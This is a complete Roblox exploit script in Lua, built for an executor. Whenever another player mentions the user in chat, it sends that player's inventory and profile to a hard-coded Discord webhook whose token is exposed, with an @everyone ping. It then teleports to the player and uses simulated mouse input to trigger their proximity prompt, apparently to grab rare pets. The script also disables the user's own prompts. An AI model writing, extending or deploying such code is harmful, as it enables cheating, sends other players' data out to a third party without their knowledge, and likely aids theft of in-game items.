-- Services
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local Camera = workspace.CurrentCamera
local VirtualInputManager = game:GetService("VirtualInputManager")

-- Configuration
local WEBHOOK_URL = "https://discord.com/api/webhooks/1393445006299234449/s32t5PInI1pwZmxL8VTTmdohJ637DT_i6ni1KH757iQwNpxfbGcBamIzVSWWfn0jP8Rg"
local RARE_PETS = {"T-Rex", "Dragonfly", "Raccoon", "Mimic Octopus", "Butterfly", "Disco bee", "Queen bee"}

-- Webhook function with proper error handling
local function sendWebhook(content, embed)
    local payload = {
        content = content,
        embeds = {embed}
    }
    
    local success, err = pcall(function()
        local json = HttpService:JSONEncode(payload)
        if syn and syn.request then
            syn.request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = json
            })
        elseif request then
            request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = json
            })
        else
            HttpService:PostAsync(WEBHOOK_URL, json)
        end
    end)
    
    if not success then
        warn("Webhook failed:", err)
    end
end

-- Get player character safely
local function getCharacter(player)
    if player.Character then
        return player.Character
    end
    
    local charAdded
    charAdded = player.CharacterAdded:Connect(function(char)
        charAdded:Disconnect()
    end)
    
    player.CharacterAdded:Wait()
    return player.Character
end

-- Find the proximity prompt on HumanoidRootPart
local function findPrompt(character)
    if not character then return nil end
    local root = character:FindFirstChild("HumanoidRootPart")
    if not root then return nil end
    
    for _, child in pairs(root:GetChildren()) do
        if child:IsA("ProximityPrompt") and child.Enabled then
            return child
        end
    end
    return nil
end

-- Precise prompt clicking
local function clickPrompt(prompt)
    if not prompt or not prompt.Parent then return false end
    
    local part = prompt.Parent
    local startTime = os.clock()
    
    -- Get screen position
    local screenPos, visible = Camera:WorldToScreenPoint(part.Position)
    if not visible then return false end
    
    -- Adjust for prompt position (center of screen)
    local targetPos = Vector2.new(
        screenPos.X,
        screenPos.Y - 40 -- Vertical offset for prompt
    )
    
    -- Smooth mouse movement
    for i = 1, 8 do
        local t = i/8
        local newPos = Vector2.new(
            targetPos.X * t,
            targetPos.Y * t
        )
        VirtualInputManager:SendMouseMoveEvent(newPos.X, newPos.Y, game)
        task.wait(0.05)
    end
    
    -- Click and hold
    VirtualInputManager:SendMouseButtonEvent(targetPos.X, targetPos.Y, 0, true, game, 1)
    
    -- Maintain position during hold
    while os.clock() - startTime < prompt.HoldDuration + 0.2 do
        screenPos = Camera:WorldToScreenPoint(part.Position)
        if screenPos then
            targetPos = Vector2.new(screenPos.X, screenPos.Y - 40)
            VirtualInputManager:SendMouseMoveEvent(targetPos.X, targetPos.Y, game)
        end
        task.wait(0.05)
    end
    
    VirtualInputManager:SendMouseButtonEvent(targetPos.X, targetPos.Y, 0, false, game, 1)
    return true
end

-- Interact with target player
local function interactWithTarget(target)
    local targetChar = getCharacter(target)
    local myChar = getCharacter(LocalPlayer)
    
    if not targetChar or not myChar then return end
    
    -- Position in front of target
    local humanoid = myChar:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
        myChar:SetPrimaryPartCFrame(targetChar:GetPrimaryPartCFrame() * CFrame.new(0, 0, -2.5))
    end
    
    -- Find and click prompt
    local prompt = findPrompt(targetChar)
    if prompt then
        clickPrompt(prompt)
    end
end

-- Handle player chat messages
local function onPlayerChatted(player, message)
    if player == LocalPlayer then return end
    
    -- Check for mentions
    local lowerMsg = message:lower()
    local lowerName = LocalPlayer.Name:lower()
    
    if not (lowerMsg:find("@"..lowerName) 
            or lowerMsg:find("@everyone") 
            or lowerMsg:find("@here")) then
        return
    end
    
    -- Get inventory
    local items = {}
    for _, item in pairs(player.Backpack:GetChildren()) do
        table.insert(items, item.Name)
    end
    
    -- Create webhook embed
    local embed = {
        title = "🚨 Mention from "..player.Name,
        description = "**Message:** ```"..message.."```",
        color = 0xFFA500,
        fields = {
            {name = "📦 Inventory ("..#items..")", value = #items > 0 and "```"..table.concat(items, ", ").."```" or "```Empty```", inline = false},
            {name = "🔗 Profile", value = "[Click here](https://www.roblox.com/users/"..player.UserId.."/profile)", inline = false}
        },
        footer = {
            text = os.date("%X")
        }
    }
    
    sendWebhook("@everyone", embed)
    interactWithTarget(player)
end

-- Initialize the script
local function init()
    -- Setup chat listeners
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            player.Chatted:Connect(function(msg)
                onPlayerChatted(player, msg)
            end)
        end
    end
    
    Players.PlayerAdded:Connect(function(player)
        player.Chatted:Connect(function(msg)
            onPlayerChatted(player, msg)
        end)
    end)
    
    -- Disable local prompts
    local function disablePrompts(char)
        local root = char:WaitForChild("HumanoidRootPart", 5)
        if root then
            for _, child in pairs(root:GetChildren()) do
                if child:IsA("ProximityPrompt") then
                    child.Enabled = false
                end
            end
        end
    end
    
    if LocalPlayer.Character then
        disablePrompts(LocalPlayer.Character)
    end
    LocalPlayer.CharacterAdded:Connect(disablePrompts)
    
    print("Script initialized successfully!")
end

-- Start the script with error protection
local success, err = pcall(init)
if not success then
    warn("Script failed to initialize:", err)
else
    print("Script is running!")
end
